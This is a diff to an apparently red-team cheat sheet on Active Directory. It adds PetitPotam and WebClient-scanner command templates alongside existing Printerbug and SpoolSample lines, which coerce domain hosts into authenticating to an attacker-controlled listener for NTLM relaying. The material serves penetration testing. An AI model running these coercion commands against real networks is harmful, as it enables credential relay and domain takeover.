@@ -1,6 +1,6 @@
-# Printerbug
+# Printerbug and Petitpotam
 
-% printerbug, Active directory
+% printerbug, petitpotam, Active directory
 
 ## Finding Spooler services listening
 #plateform/linux  #target/remote #cat/RECON 
@@ -28,6 +28,20 @@ https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
 
 ```
 printerbug.py '<domain>/<user>:<password>'@<ip> <attacker_ip>
+```
+
+## webclientservicescanner
+#plateform/linux  #target/remote #cat/RECON
+https://github.com/Hackndo/WebclientServiceScanner
+```
+webclientservicescanner '<domain>/<user>:<password>'@<ip_range>
+```
+
+## PetitPotam
+#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT
+https://github.com/topotam/PetitPotam
+```
+PetitPotam.py -u <user> -p '<password>' -d <domain> <listener> <target>
 ```
 
 ## ntlmrelayx add computer
@@ -95,4 +109,4 @@ SpoolSample.exe <target_server> <capture_server>
 = dc1 : DC01.domain.local
 = dc2 : DC02.domain.local
 = computer_password : 123soleil
-
+= ip_range : 192.168.1.0/24
